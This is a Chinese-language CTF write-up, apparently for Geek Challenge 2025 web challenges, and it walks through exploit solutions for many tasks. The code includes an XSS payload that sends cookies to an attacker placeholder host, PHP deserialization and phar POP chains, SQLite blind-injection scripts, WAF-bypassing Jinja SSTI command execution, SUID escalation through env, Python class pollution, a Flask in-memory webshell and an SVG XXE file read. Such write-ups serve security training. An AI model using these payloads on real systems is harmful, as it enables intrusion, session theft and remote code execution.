[{"content":"阿基里斯追乌龟 抓包修改 achilles_distanc ，改为和 tortoise_distanc 一样大：\nflag：\nVibe SEO 获取站点地图 sitemap.xml：\n\u0026lt;urlset\u0026gt; \u0026lt;url\u0026gt; \u0026lt;loc\u0026gt;http://localhost/\u0026lt;/loc\u0026gt; \u0026lt;changefreq\u0026gt;weekly\u0026lt;/changefreq\u0026gt; \u0026lt;/url\u0026gt; \u0026lt;url\u0026gt; \u0026lt;loc\u0026gt;http://localhost/aa__^^.php\u0026lt;/loc\u0026gt; \u0026lt;changefreq\u0026gt;never\u0026lt;/changefreq\u0026gt; \u0026lt;/url\u0026gt; \u0026lt;/urlset\u0026gt; 访问 aa__^^.php，根据报错判断是个任意文件读取：\nWarning: Undefined array key \u0026#34;filename\u0026#34; in /var/www/html/aa__^^.php on line 3 文件名最长为10，正好读取 aa__^^.php：\n\u0026lt;?php $flag = fopen(\u0026#39;/my_secret.txt\u0026#39;, \u0026#39;r\u0026#39;); if (strlen($_GET[\u0026#39;filename\u0026#39;]) \u0026lt; 11) { readfile($_GET[\u0026#39;filename\u0026#39;]); } else { echo \u0026#34;Filename too long\u0026#34;; } 一开始用伪协议 php://fd 无法读取到flag，猜测是分配的fd比较大，改用 /dev/fd 来爆破 0~99，在 /dev/fd/13 读取到flag内容：\nXross The Finish Line 过滤了空格，单双引号，script，error，img\nxss窃取cookie：\n\u0026lt;svg/onload=fetch(`http://ip:port/steal?c=${document.cookie}`)\u0026gt; Expression 爆破出jwt密钥：secret，伪造jwt：\n猜测有ejs模板渲染：\npopself index.php：\n\u0026lt;?php show_source(__FILE__); error_reporting(0); class All_in_one { public $KiraKiraAyu; public $_4ak5ra; public $K4per; public $Samsāra; public $komiko; public $Fox; public $Eureka; public $QYQS; public $sleep3r; public $ivory; public $L; public function __set($name, $value){ echo \u0026#34;他还是没有忘记那个\u0026#34;.$value.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;收集夏日的碎片吧\u0026lt;br\u0026gt;\u0026#34;; $fox = $this-\u0026gt;Fox; if ( !($fox instanceof All_in_one) \u0026amp;\u0026amp; $fox()===\u0026#34;summer\u0026#34;){ echo \u0026#34;QYQS enjoy summer\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;开启循环吧\u0026lt;br\u0026gt;\u0026#34;; $komiko = $this-\u0026gt;komiko; $komiko-\u0026gt;Eureka($this-\u0026gt;L, $this-\u0026gt;sleep3r); } } public function __invoke(){ echo \u0026#34;恭喜成功signin!\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;welcome to Geek_Challenge2025!\u0026lt;br\u0026gt;\u0026#34;; $f = $this-\u0026gt;Samsāra; $arg = $this-\u0026gt;ivory; $f($arg); } public function __destruct(){ echo \u0026#34;你能让K4per和KiraKiraAyu组成一队吗\u0026lt;br\u0026gt;\u0026#34;; if (is_string($this-\u0026gt;KiraKiraAyu) \u0026amp;\u0026amp; is_string($this-\u0026gt;K4per)) { if (md5(md5($this-\u0026gt;KiraKiraAyu))===md5($this-\u0026gt;K4per)){ die(\u0026#34;boys和而不同\u0026lt;br\u0026gt;\u0026#34;); } if(md5(md5($this-\u0026gt;KiraKiraAyu))==md5($this-\u0026gt;K4per)){ echo \u0026#34;BOY♂ sign GEEK\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;开启循环吧\u0026lt;br\u0026gt;\u0026#34;; $this-\u0026gt;QYQS-\u0026gt;partner = \u0026#34;summer\u0026#34;; } else { echo \u0026#34;BOY♂ can`t sign GEEK\u0026lt;br\u0026gt;\u0026#34;; echo md5(md5($this-\u0026gt;KiraKiraAyu)).\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo md5($this-\u0026gt;K4per).\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } } else{ die(\u0026#34;boys堂堂正正\u0026#34;); } } public function __tostring(){ echo \u0026#34;再走一步...\u0026lt;br\u0026gt;\u0026#34;; $a = $this-\u0026gt;_4ak5ra; $a(); } public function __call($method, $args){ if (strlen($args[0])\u0026lt;4 \u0026amp;\u0026amp; ($args[0]+1)\u0026gt;10000){ echo \u0026#34;再走一步\u0026lt;br\u0026gt;\u0026#34;; echo $args[1]; } else{ echo \u0026#34;你要努力进窄门\u0026lt;br\u0026gt;\u0026#34;; } } } class summer { public static function find_myself(){ return \u0026#34;summer\u0026#34;; } } $payload = $_GET[\u0026#34;24_SYC.zip\u0026#34;]; if (isset($payload)) { unserialize($payload); } else { echo \u0026#34;没有大家的压缩包的话，瓦达西！\u0026lt;br\u0026gt;\u0026#34;; } ?\u0026gt; 注意md5那部分需要最后0e后的都是数字才能绕过，否则仍被当作字符串比较无法绕过，还有后续科学计数法绕过时需要是字符串类型，否则长度会是数值的长度导致无法绕过strlen\n__destruct() -\u0026gt; __set() -\u0026gt; __call() -\u0026gt; __tostring() -\u0026gt; __invoke()，exp：\n\u0026lt;?php class All_in_one { public $KiraKiraAyu; public $_4ak5ra; public $K4per; public $Samsāra; public $komiko; public $Fox; public $Eureka; public $QYQS; public $sleep3r; public $ivory; public $L; } class summer { public static function find_myself(){ return \u0026#34;summer\u0026#34;; } } // __invoke $obj1 = new All_in_one(); $obj1-\u0026gt;Samsāra = \u0026#34;system\u0026#34;; $obj1-\u0026gt;ivory = \u0026#34;env\u0026#34;; // __toString $obj2 = new All_in_one(); $obj2-\u0026gt;_4ak5ra = $obj1; // __set+__call $obj3 = new All_in_one(); $obj3-\u0026gt;Fox = \u0026#34;summer::find_myself\u0026#34;; $obj3-\u0026gt;komiko = $obj2; $obj3-\u0026gt;Eureka = \u0026#34;nonexistence\u0026#34;; $obj3-\u0026gt;L = \u0026#34;1e5\u0026#34;;\t// $args[0] $obj3-\u0026gt;sleep3r = $obj2; // $args[1] $obj4 = new All_in_one(); $obj4-\u0026gt;KiraKiraAyu = \u0026#34;iv2Cn\u0026#34;; // f2WfQ $obj4-\u0026gt;K4per = \u0026#34;240610708\u0026#34;; $obj4-\u0026gt;QYQS = $obj3; echo urlencode(serialize($obj4)); ?\u0026gt; payload：\n?24[SYC.zip=O%3A10%3A%22All_in_one%22%3A11%3A%7Bs%3A11%3A%22KiraKiraAyu%22%3Bs%3A5%3A%22iv2Cn%22%3Bs%3A7%3A%22_4ak5ra%22%3BN%3Bs%3A5%3A%22K4per%22%3Bs%3A9%3A%22240610708%22%3Bs%3A8%3A%22Sams%C4%81ra%22%3BN%3Bs%3A6%3A%22komiko%22%3BN%3Bs%3A3%3A%22Fox%22%3BN%3Bs%3A6%3A%22Eureka%22%3BN%3Bs%3A4%3A%22QYQS%22%3BO%3A10%3A%22All_in_one%22%3A11%3A%7Bs%3A11%3A%22KiraKiraAyu%22%3BN%3Bs%3A7%3A%22_4ak5ra%22%3BN%3Bs%3A5%3A%22K4per%22%3BN%3Bs%3A8%3A%22Sams%C4%81ra%22%3BN%3Bs%3A6%3A%22komiko%22%3BO%3A10%3A%22All_in_one%22%3A11%3A%7Bs%3A11%3A%22KiraKiraAyu%22%3BN%3Bs%3A7%3A%22_4ak5ra%22%3BO%3A10%3A%22All_in_one%22%3A11%3A%7Bs%3A11%3A%22KiraKiraAyu%22%3BN%3Bs%3A7%3A%22_4ak5ra%22%3BN%3Bs%3A5%3A%22K4per%22%3BN%3Bs%3A8%3A%22Sams%C4%81ra%22%3Bs%3A6%3A%22system%22%3Bs%3A6%3A%22komiko%22%3BN%3Bs%3A3%3A%22Fox%22%3BN%3Bs%3A6%3A%22Eureka%22%3BN%3Bs%3A4%3A%22QYQS%22%3BN%3Bs%3A7%3A%22sleep3r%22%3BN%3Bs%3A5%3A%22ivory%22%3Bs%3A3%3A%22env%22%3Bs%3A1%3A%22L%22%3BN%3B%7Ds%3A5%3A%22K4per%22%3BN%3Bs%3A8%3A%22Sams%C4%81ra%22%3BN%3Bs%3A6%3A%22komiko%22%3BN%3Bs%3A3%3A%22Fox%22%3BN%3Bs%3A6%3A%22Eureka%22%3BN%3Bs%3A4%3A%22QYQS%22%3BN%3Bs%3A7%3A%22sleep3r%22%3BN%3Bs%3A5%3A%22ivory%22%3BN%3Bs%3A1%3A%22L%22%3BN%3B%7Ds%3A3%3A%22Fox%22%3Bs%3A19%3A%22summer%3A%3Afind_myself%22%3Bs%3A6%3A%22Eureka%22%3Bs%3A12%3A%22nonexistence%22%3Bs%3A4%3A%22QYQS%22%3BN%3Bs%3A7%3A%22sleep3r%22%3Br%3A14%3Bs%3A5%3A%22ivory%22%3BN%3Bs%3A1%3A%22L%22%3Bs%3A3%3A%221e5%22%3B%7Ds%3A7%3A%22sleep3r%22%3BN%3Bs%3A5%3A%22ivory%22%3BN%3Bs%3A1%3A%22L%22%3BN%3B%7D one last image PNG头 + 短标签 绕过waf:\nflag在环境变量里：\nSequal No Uta 单引号闭合：\n过滤了空格，注释符绕过：\n布尔盲注，先查 sqite_lmaster 表里的创建语句：\ndef sql(): target = \u0026#34;http://019a6318-c732-7f8b-8582-ffeba4a20572.geek.ctfplus.cn/check.php\u0026#34; sql = \u0026#34;\u0026#34; for i in range(1,250): for char in string.whitespace + \u0026#34;\\n~!@#$%^\u0026amp;*()_+-=\u0026#34; + string.ascii_uppercase + string.ascii_lowercase + string.digits: payload = f\u0026#34;admin\u0026#39;/**/and/**/substr((select/**/group_concat(sql)/**/from/**/sqlite_master),{i},1)=\u0026#39;{char}\u0026#39;;\u0026#34; params = {\u0026#34;name\u0026#34;: payload} resp = requests.get(url=target, params=params) if \u0026#34;该用户存在且活跃\u0026#34; in resp.text: sql += char print(f\u0026#34;Found: {sql}\u0026#34;) break return sql users 表创建语句：\nCREATE TABLE users( id INTEGER PRIMARYKEY AUTO INCREMENT username TEXT UNIQUE NOT NULL password TEXT UNIQUE NOT NULL is_active INTEGER NOT NULL DEFAULT 1 secret TEXT ) 查secret字段，字段里的值就是flag：\ndef secret(): target = \u0026#34;http://019a6318-c732-7f8b-8582-ffeba4a20572.geek.ctfplus.cn/check.php\u0026#34; secret = \u0026#34;\u0026#34; for i in range(1,50): for char in string.whitespace + \u0026#34;}{\\n~!@#$%^\u0026amp;*()_+-=\u0026#34; + string.ascii_uppercase + string.ascii_lowercase + string.digits: payload = f\u0026#34;admin\u0026#39;/**/and/**/substr((select/**/group_concat(secret)/**/from/**/users),{i},1)=\u0026#39;{char}\u0026#39;;\u0026#34; params = {\u0026#34;name\u0026#34;: payload} resp = requests.get(url=target, params=params) if \u0026#34;该用户存在且活跃\u0026#34; in resp.text: secret += char print(f\u0026#34;Found: {secret}\u0026#34;) break return secret ez_read 读取故事页面存在任意文件读取，测试一下就知道有个../的替换，读取 ....//app.py：\nfrom flask import Flask, request, render_template, render_template_string, redirect, url_for, session import os app = Flask(__name__, template_folder=\u0026#34;templates\u0026#34;, static_folder=\u0026#34;static\u0026#34;) app.secret_key = \u0026#34;key_ciallo_secret\u0026#34; USERS = {} def waf(payload: str) -\u0026gt; str: print(len(payload)) if not payload: return \u0026#34;\u0026#34; if len(payload) not in (114, 514): return payload.replace(\u0026#34;(\u0026#34;, \u0026#34;\u0026#34;) else: waf = [\u0026#34;__class__\u0026#34;, \u0026#34;__base__\u0026#34;, \u0026#34;__subclasses__\u0026#34;, \u0026#34;__globals__\u0026#34;, \u0026#34;import\u0026#34;,\u0026#34;self\u0026#34;,\u0026#34;session\u0026#34;,\u0026#34;blueprints\u0026#34;,\u0026#34;get_debug_flag\u0026#34;,\u0026#34;json\u0026#34;,\u0026#34;get_template_attribute\u0026#34;,\u0026#34;render_template\u0026#34;,\u0026#34;render_template_string\u0026#34;,\u0026#34;abort\u0026#34;,\u0026#34;redirect\u0026#34;,\u0026#34;make_response\u0026#34;,\u0026#34;Response\u0026#34;,\u0026#34;stream_with_context\u0026#34;,\u0026#34;flash\u0026#34;,\u0026#34;escape\u0026#34;,\u0026#34;Markup\u0026#34;,\u0026#34;MarkupSafe\u0026#34;,\u0026#34;tojson\u0026#34;,\u0026#34;datetime\u0026#34;,\u0026#34;cycler\u0026#34;,\u0026#34;joiner\u0026#34;,\u0026#34;namespace\u0026#34;,\u0026#34;lipsum\u0026#34;] for w in waf: if w in payload: raise ValueError(f\u0026#34;waf\u0026#34;) return payload @app.route(\u0026#34;/\u0026#34;) def index(): user = session.get(\u0026#34;user\u0026#34;) return render_template(\u0026#34;index.html\u0026#34;, user=user) @app.route(\u0026#34;/register\u0026#34;, methods=[\u0026#34;GET\u0026#34;, \u0026#34;POST\u0026#34;]) def register(): if request.method == \u0026#34;POST\u0026#34;: username = (request.form.get(\u0026#34;username\u0026#34;) or \u0026#34;\u0026#34;) password = request.form.get(\u0026#34;password\u0026#34;) or \u0026#34;\u0026#34; if not username or not password: return render_template(\u0026#34;register.html\u0026#34;, error=\u0026#34;用户名和密码不能为空\u0026#34;) if username in USERS: return render_template(\u0026#34;register.html\u0026#34;, error=\u0026#34;用户名已存在\u0026#34;) USERS[username] = {\u0026#34;password\u0026#34;: password} session[\u0026#34;user\u0026#34;] = username return redirect(url_for(\u0026#34;profile\u0026#34;)) return render_template(\u0026#34;register.html\u0026#34;) @app.route(\u0026#34;/login\u0026#34;, methods=[\u0026#34;GET\u0026#34;, \u0026#34;POST\u0026#34;]) def login(): if request.method == \u0026#34;POST\u0026#34;: username = (request.form.get(\u0026#34;username\u0026#34;) or \u0026#34;\u0026#34;).strip() password = request.form.get(\u0026#34;password\u0026#34;) or \u0026#34;\u0026#34; user = USERS.get(username) if not user or user.get(\u0026#34;password\u0026#34;) != password: return render_template(\u0026#34;login.html\u0026#34;, error=\u0026#34;用户名或密码错误\u0026#34;) session[\u0026#34;user\u0026#34;] = username return redirect(url_for(\u0026#34;profile\u0026#34;)) return render_template(\u0026#34;login.html\u0026#34;) @app.route(\u0026#34;/logout\u0026#34;) def logout(): session.clear() return redirect(url_for(\u0026#34;index\u0026#34;)) @app.route(\u0026#34;/profile\u0026#34;) def profile(): user = session.get(\u0026#34;user\u0026#34;) if not user: return redirect(url_for(\u0026#34;login\u0026#34;)) name_raw = request.args.get(\u0026#34;name\u0026#34;, user) try: filtered = waf(name_raw) tmpl = f\u0026#34;欢迎，{filtered}\u0026#34; rendered_snippet = render_template_string(tmpl) error_msg = None except Exception as e: rendered_snippet = \u0026#34;\u0026#34; error_msg = f\u0026#34;渲染错误: {e}\u0026#34; return render_template( \u0026#34;profile.html\u0026#34;, content=rendered_snippet, name_input=name_raw, user=user, error_msg=error_msg, ) @app.route(\u0026#34;/read\u0026#34;, methods=[\u0026#34;GET\u0026#34;, \u0026#34;POST\u0026#34;]) def read_file(): user = session.get(\u0026#34;user\u0026#34;) if not user: return redirect(url_for(\u0026#34;login\u0026#34;)) base_dir = os.path.join(os.path.dirname(__file__), \u0026#34;story\u0026#34;) try: entries = sorted([f for f in os.listdir(base_dir) if os.path.isfile(os.path.join(base_dir, f))]) except FileNotFoundError: entries = [] filename = \u0026#34;\u0026#34; if request.method == \u0026#34;POST\u0026#34;: filename = request.form.get(\u0026#34;filename\u0026#34;) or \u0026#34;\u0026#34; else: filename = request.args.get(\u0026#34;filename\u0026#34;) or \u0026#34;\u0026#34; content = None error = None if filename: sanitized = filename.replace(\u0026#34;../\u0026#34;, \u0026#34;\u0026#34;) target_path = os.path.join(base_dir, sanitized) if not os.path.isfile(target_path): error = f\u0026#34;文件不存在: {sanitized}\u0026#34; else: with open(target_path, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;, errors=\u0026#34;ignore\u0026#34;) as f: content = f.read() return render_template(\u0026#34;read.html\u0026#34;, files=entries, content=content, filename=filename, error=error, user=user) if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=8080, debug=False) /profile 路由下存在 ssti，构造114长度的payload，否则无法处理过滤括号\n利用config缩短payload长度，flag需要root权限读取，查找suid权限文件：\n{{config[\u0026#39;__cl\u0026#39;+\u0026#39;ass__\u0026#39;].__init__[\u0026#39;__glo\u0026#39;+\u0026#39;bals__\u0026#39;][\u0026#39;os\u0026#39;].popen(\u0026#39;find / -perm -u=s -type f 2\u0026gt;/dev/null\u0026#39;).read() }}\r/usr/bin/su\r/usr/bin/gpasswd\r/usr/bin/chfn\r/usr/bin/chsh\r/usr/bin/umount\r/usr/bin/newgrp\r/usr/bin/passwd\r/usr/bin/mount\r/usr/local/bin/env 查看env：\n{{config[\u0026#39;__cl\u0026#39;+\u0026#39;ass__\u0026#39;].__init__[\u0026#39;__glo\u0026#39;+\u0026#39;bals__\u0026#39;][\u0026#39;os\u0026#39;].popen(\u0026#39;env\u0026#39;).read() }}\rHINT=用我提个权吧 env后直接跟命令实现suid提权：\n{{config[\u0026#39;__cl\u0026#39;+\u0026#39;ass__\u0026#39;].__init__[\u0026#39;__glo\u0026#39;+\u0026#39;bals__\u0026#39;][\u0026#39;os\u0026#39;].popen(\u0026#39;env cat /flag\u0026#39;).read() }} 百年继承 正常流程：\n上校已创建。\r上校继承于他的父亲,他的父亲继承于人类\r时间流逝：卷入武装起义：命运与战争交织。\r时间流逝：抉择时刻：上校需要做出选择（武器与策略）。\r事件：上校使用 spear，采取 ambush 策略。世界线变动...\r(上校的weapon属性被赋值为spear,tactic属性被赋值为ambush)\r时间流逝：宿命延续：行军与退却。\r时间流逝：面对行刑队：命运的审判即将到来。\r行刑队：开始执行判决。\r行刑队也继承于人类\r临死之前,上校目光瞄着行刑队的佩剑,上面分明写着：\rlambda executor, target: (target.__del__(), setattr(target, \u0026#39;alive\u0026#39;, False), \u0026#39;处决成功\u0026#39;)\r这是人类自古以来就拥有的execute_method属性...\r处决成功\r时间流逝：结局：命运如沙漏般倾泻…… 上校继承于父亲，父亲继承于人类，自定义的 weapon 和 tactic 都是上校的属性，行刑队同样继承于人类，最后行刑执行的是人类的 execute_method 属性，页面回显是第三个操作结果\npython 原型链污染，目标是将人类的 execute_method 第三个操作部分设置为命令执行结果\n{ \u0026#34;weapon\u0026#34;: \u0026#34;spear\u0026#34;, \u0026#34;tactic\u0026#34;: \u0026#34;ambush\u0026#34;, \u0026#34;__class__\u0026#34;: { \u0026#34;__base__\u0026#34;: { \u0026#34;__base__\u0026#34;: { \u0026#34;execute_method\u0026#34;: \u0026#34;lambda executor, target: (target.__del__(), setattr(target, \u0026#39;alive\u0026#39;, False), __import__(\u0026#39;os\u0026#39;).popen(\u0026#39;env\u0026#39;).read())\u0026#34; } } } } ez-seralize index.php：\n\u0026lt;?php ini_set(\u0026#39;display_errors\u0026#39;, \u0026#39;0\u0026#39;); $filename = isset($_GET[\u0026#39;filename\u0026#39;]) ? $_GET[\u0026#39;filename\u0026#39;] : null; $content = null; $error = null; if (isset($filename) \u0026amp;\u0026amp; $filename !== \u0026#39;\u0026#39;) { $balcklist = [\u0026#34;../\u0026#34;,\u0026#34;%2e\u0026#34;,\u0026#34;..\u0026#34;,\u0026#34;data://\u0026#34;,\u0026#34;\\n\u0026#34;,\u0026#34;input\u0026#34;,\u0026#34;%0a\u0026#34;,\u0026#34;%\u0026#34;,\u0026#34;\\r\u0026#34;,\u0026#34;%0d\u0026#34;,\u0026#34;php://\u0026#34;,\u0026#34;/etc/passwd\u0026#34;,\u0026#34;/proc/self/environ\u0026#34;,\u0026#34;php:file\u0026#34;,\u0026#34;filter\u0026#34;]; foreach ($balcklist as $v) { if (strpos($filename, $v) !== false) { $error = \u0026#34;no no no\u0026#34;; break; } } if ($error === null) { if (isset($_GET[\u0026#39;serialized\u0026#39;])) { require \u0026#39;function.php\u0026#39;; $file_contents= file_get_contents($filename); if ($file_contents === false) { $error = \u0026#34;Failed to read seraizlie file or file does not exist: \u0026#34; . htmlspecialchars($filename); } else { $content = $file_contents; } } else { $file_contents = file_get_contents($filename); if ($file_contents === false) { $error = \u0026#34;Failed to read file or file does not exist: \u0026#34; . htmlspecialchars($filename); } else { $content = $file_contents; } } } } else { $error = null; } ?\u0026gt; \u0026lt;?php if ($error !== null \u0026amp;\u0026amp; $error !== \u0026#39;\u0026#39;): ?\u0026gt; \u0026lt;div class=\u0026#34;alert error\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;\u0026lt;?php echo htmlspecialchars($error, ENT_QUOTES); ?\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;?php endif; ?\u0026gt; \u0026lt;!--RUN printf \u0026#34;open_basedir=/var/www/html:/tmp\\nsys_temp_dir=/tmp\\nupload_tmp_dir=/tmp\\n\u0026#34; \\ \u0026gt; /usr/local/etc/php/conf.d/zz-open_basedir.ini--\u0026gt; \u0026lt;?php if ($content !== null): ?\u0026gt; \u0026lt;div class=\u0026#34;result\u0026#34; aria-live=\u0026#34;polite\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;meta\u0026#34;\u0026gt; \u0026lt;div\u0026gt;文件：\u0026lt;?php echo htmlspecialchars($filename, ENT_QUOTES); ?\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div style=\u0026#34;font-size:12px;color:var(--muted)\u0026#34;\u0026gt;\u0026lt;?php echo strlen($content); ?\u0026gt; bytes\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;body\u0026#34;\u0026gt;\u0026lt;pre\u0026gt;\u0026lt;?php echo htmlspecialchars($content, ENT_QUOTES); ?\u0026gt;\u0026lt;/pre\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php elseif ($error === null \u0026amp;\u0026amp; isset($_GET[\u0026#39;filename\u0026#39;])): ?\u0026gt; \u0026lt;div class=\u0026#34;alert warn\u0026#34;\u0026gt;未能读取内容或文件为空。\u0026lt;/div\u0026gt; \u0026lt;?php endif; ?\u0026gt; function.php：\n\u0026lt;?php class A { public $file; public $luo; public function __construct() { } public function __toString() { $function = $this-\u0026gt;luo; return $function(); } } class B { public $a; public $test; public function __construct() { } public function __wakeup() { echo($this-\u0026gt;test); } public function __invoke() { $this-\u0026gt;a-\u0026gt;rce_me(); } } class C { public $b; public function __construct($b = null) { $this-\u0026gt;b = $b; } public function rce_me() { echo \u0026#34;Success!\\n\u0026#34;; system(\u0026#34;cat /flag/flag.txt \u0026gt; /tmp/flag\u0026#34;); } } 想找文件上传点，robots.txt：\nUser-agent: * Disallow: /var/www/html/uploads.php uploads.php：\n\u0026lt;?php $uploadDir = __DIR__ . \u0026#39;/uploads/\u0026#39;; if (!is_dir($uploadDir)) { mkdir($uploadDir, 0755, true); } $whitelist = [\u0026#39;txt\u0026#39;, \u0026#39;log\u0026#39;, \u0026#39;jpg\u0026#39;, \u0026#39;jpeg\u0026#39;, \u0026#39;png\u0026#39;, \u0026#39;zip\u0026#39;,\u0026#39;gif\u0026#39;,\u0026#39;gz\u0026#39;]; $allowedMimes = [ \u0026#39;txt\u0026#39; =\u0026gt; [\u0026#39;text/plain\u0026#39;], \u0026#39;log\u0026#39; =\u0026gt; [\u0026#39;text/plain\u0026#39;], \u0026#39;jpg\u0026#39; =\u0026gt; [\u0026#39;image/jpeg\u0026#39;], \u0026#39;jpeg\u0026#39; =\u0026gt; [\u0026#39;image/jpeg\u0026#39;], \u0026#39;png\u0026#39; =\u0026gt; [\u0026#39;image/png\u0026#39;], \u0026#39;zip\u0026#39; =\u0026gt; [\u0026#39;application/zip\u0026#39;, \u0026#39;application/x-zip-compressed\u0026#39;, \u0026#39;multipart/x-zip\u0026#39;], \u0026#39;gif\u0026#39; =\u0026gt; [\u0026#39;image/gif\u0026#39;], \u0026#39;gz\u0026#39; =\u0026gt; [\u0026#39;application/gzip\u0026#39;, \u0026#39;application/x-gzip\u0026#39;] ]; $resultMessage = \u0026#39;\u0026#39;; if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39; \u0026amp;\u0026amp; isset($_FILES[\u0026#39;file\u0026#39;])) { $file = $_FILES[\u0026#39;file\u0026#39;]; if ($file[\u0026#39;error\u0026#39;] === UPLOAD_ERR_OK) { $originalName = $file[\u0026#39;name\u0026#39;]; $ext = strtolower(pathinfo($originalName, PATHINFO_EXTENSION)); if (!in_array($ext, $whitelist, true)) { die(\u0026#39;File extension not allowed.\u0026#39;); } $mime = $file[\u0026#39;type\u0026#39;]; if (!isset($allowedMimes[$ext]) || !in_array($mime, $allowedMimes[$ext], true)) { die(\u0026#39;MIME type mismatch or not allowed. Detected: \u0026#39; . htmlspecialchars($mime)); } $safeBaseName = preg_replace(\u0026#39;/[^A-Za-z0-9_\\-\\.]/\u0026#39;, \u0026#39;_\u0026#39;, basename($originalName)); $safeBaseName = ltrim($safeBaseName, \u0026#39;.\u0026#39;); $targetFilename = time() . \u0026#39;_\u0026#39; . $safeBaseName; file_put_contents(\u0026#39;/tmp/log.txt\u0026#39;, \u0026#34;upload file success: $targetFilename, MIME: $mime\\n\u0026#34;); $targetPath = $uploadDir . $targetFilename; if (move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;], $targetPath)) { @chmod($targetPath, 0644); $resultMessage = \u0026#39;\u0026lt;div class=\u0026#34;success\u0026#34;\u0026gt; File uploaded successfully \u0026#39;. \u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; } else { $resultMessage = \u0026#39;\u0026lt;div class=\u0026#34;error\u0026#34;\u0026gt; Failed to move uploaded file.\u0026lt;/div\u0026gt;\u0026#39;; } } else { $resultMessage = \u0026#39;\u0026lt;div class=\u0026#34;error\u0026#34;\u0026gt; Upload error: \u0026#39; . $file[\u0026#39;error\u0026#39;] . \u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; } } ?\u0026gt; B.__wakeup() -\u0026gt; A.__toString() -\u0026gt; B.__invoke()，应该是要利用phar伪协议进行反序列化，exp：\n\u0026lt;?php class A { public $file; public $luo; } class B { public $a; public $test; } class C { public $b; } $obj1 = new C(); $obj2 = new B(); $obj2-\u0026gt;a = $obj1; $obj3 = new A(); $obj3-\u0026gt;luo = $obj2; $obj4 = new B(); $obj4-\u0026gt;test = $obj3; @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#39;phar.phar\u0026#39;); $phar -\u0026gt; stopBuffering(); $phar -\u0026gt; setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); $phar -\u0026gt; addFromString(\u0026#39;test.txt\u0026#39;,\u0026#39;test\u0026#39;); $phar -\u0026gt; setMetadata($obj4); $phar -\u0026gt; stopBuffering(); ?\u0026gt; 修改phar后缀名为jpg，上传文件后读取 /tmp/log.txt：\nupload file success: 1762752974_phar.jpg, MIME: image/jpeg 根据 index.php 中关于 open_basedir 的信息：\n\u0026lt;!--RUN printf \u0026#34;open_basedir=/var/www/html:/tmp\\nsys_temp_dir=/tmp\\nupload_tmp_dir=/tmp\\n\u0026#34; \\\r\u0026gt; /usr/local/etc/php/conf.d/zz-open_basedir.ini--\u0026gt; 可以直接访问上传的目录，后续直接phar反序列化上传文件即可，注意添加 serialized 参数用于包含 function.php：\n最后读取 /tmp/flag 获取flag\neeeeezzzzzzZip phar include RCE，将 phar 打包成 gz等压缩文件被 include 同样会执行stub中的php代码，exp：\n\u0026lt;?php $phar = new Phar(\u0026#39;exploit.phar\u0026#39;); $phar-\u0026gt;startBuffering(); $stub = \u0026lt;\u0026lt;\u0026lt;\u0026#39;STUB\u0026#39; \u0026lt;?php system(\u0026#39;cat /flag/flag.txt\u0026#39;); __HALT_COMPILER(); ?\u0026gt; STUB; $phar-\u0026gt;setStub($stub); $phar-\u0026gt;addFromString(\u0026#39;test.txt\u0026#39;, \u0026#39;test\u0026#39;); $phar-\u0026gt;stopBuffering(); ?\u0026gt; 路在脚下 初步测试，ban了 before_request after_request error，由于网页无执行结果回显考虑打内存马创建路由\n向 url_map 中新增一条 urlrule 创建 /shell 路由，payload1：\n{{url_for.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;app.url_map.add(app.url_rule_class(\u0026#39;/shell\u0026#39;,methods=[\u0026#39;GET\u0026#39;],endpoint=\u0026#39;shell\u0026#39;))\u0026#34;,{\u0026#39;app\u0026#39;:url_for.__globals__[\u0026#39;current_app\u0026#39;]})}} 向 view_function 中添加对应 endpoint 的实现\n{{url_for.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;app.view_functions.update({\u0026#39;shell\u0026#39;:lambda:__import__(\u0026#39;os\u0026#39;).popen(app.request_context.__globals__[\u0026#39;request_ctx\u0026#39;].request.args.get(\u0026#39;cmd\u0026#39;,\u0026#39;whoami\u0026#39;)).read()})\u0026#34;,{\u0026#39;app\u0026#39;:url_for.__globals__[\u0026#39;current_app\u0026#39;]})}} 访问 /shell，页面显示 root 表明路由创建成功，传参cmd实现rce\nImage Viewer 允许上传的文件类型：\n\u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; accept=\u0026#34;.svg,image/svg+xml,.png,.jpg,.jpeg,.gif,image/*\u0026#34; /\u0026gt; svg XXE：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///flag\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;svg width=\u0026#34;400px\u0026#34; height=\u0026#34;128px\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; xmlns:xlink=\u0026#34;http://www.w3.org/1999/xlink\u0026#34; version=\u0026#34;1.1\u0026#34;\u0026gt; \u0026lt;text font-size=\u0026#34;16\u0026#34; x=\u0026#34;0\u0026#34; y=\u0026#34;16\u0026#34;\u0026gt;\u0026amp;xxe;\u0026lt;/text\u0026gt; \u0026lt;/svg\u0026gt; 